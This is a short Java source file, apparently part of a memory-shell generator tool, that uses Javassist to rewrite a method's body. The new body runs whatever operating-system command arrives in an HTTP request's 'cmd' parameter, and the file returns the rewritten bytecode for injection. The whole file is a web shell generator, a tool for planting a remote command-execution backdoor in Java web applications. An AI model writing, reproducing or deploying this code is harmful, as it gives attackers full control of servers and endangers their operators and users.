import javassist.CtMethod;
import jmg.core.generator.IShellGenerator;
class Generator implements IShellGenerator {
  byte[] makeShell(CtMethod method) throws Exception {
    method.setBody("{ Runtime.getRuntime().exec(request.getParameter(\"cmd\")); }");
    return method.getDeclaringClass().toBytecode();
  }
}
